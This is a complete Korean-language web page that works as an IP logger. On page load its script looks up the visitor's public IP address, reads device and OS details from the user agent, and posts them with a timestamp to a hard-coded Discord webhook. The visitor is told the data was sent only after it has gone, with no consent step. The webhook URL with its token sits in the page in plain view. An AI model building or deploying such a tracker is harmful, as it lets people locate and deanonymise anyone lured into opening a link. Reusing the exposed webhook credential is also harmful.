<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>접속 중...</title>
  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f0f2f5;
      font-family: sans-serif;
    }
    .container {
      text-align: center;
      background: white;
      padding: 60px 50px;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      max-width: 400px;
    }
    h1 { color: #5865F2; margin-bottom: 20px; }
    #status {
      padding: 20px;
      border-radius: 12px;
      font-size: 1.1em;
      min-height: 80px;
    }
    .success { background: #d4edda; color: #155724; }
  </style>
</head>
<body>

  <div class="container">
    <h1>잠시만 기다려주세요...</h1>
    <div id="status">접속 정보를 기록 중입니다...</div>
  </div>

  <script>
    window.addEventListener('load', async () => {
      const status = document.getElementById('status');

      try {
        // IP 주소 가져오기
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipRes.json();

        // 기기 정보 파싱
        const parser = new UAParser();
        const result = parser.getResult();
        const deviceInfo = 
          (result.device.vendor || 'Unknown') + ' ' +
          (result.device.model || 'Unknown') + ' (' +
          (result.os.name || 'Unknown') + ' ' +
          (result.os.version || '') + ')';

        const now = new Date().toISOString();

        // Discord에 보낼 데이터
        const payload = {
          embeds: [{
            title: "새 접속",
            color: 0x5865F2,
            fields: [
              { name: "IP 주소", value: `\`${ip}\``, inline: true },
              { name: "기기 정보", value: deviceInfo || '알 수 없음', inline: false },
              { name: "접속 시간", value: now, inline: false }
            ],
            footer: { text: "Busan" },
            timestamp: now
          }]
        };

        // 새 웹훅 URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1462322985607106727/oZ-kIdtzVKkryI2jbrMmVdKFVhDqbYYE4ccC7hM5--xart6n6yF5pn6awZzjhFKyJDUo";

        await fetch(WEBHOOK_URL, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        status.innerHTML = "기록 완료 ✓<br>IP와 기기 정보가 전송되었습니다!";
        status.classList.add('success');

      } catch (err) {
        console.error('에러:', err);
        status.innerHTML = "기록 실패 ㅠㅠ<br>콘솔(F12) 확인해주세요";
      }
    });
  </script>

</body>
</html>
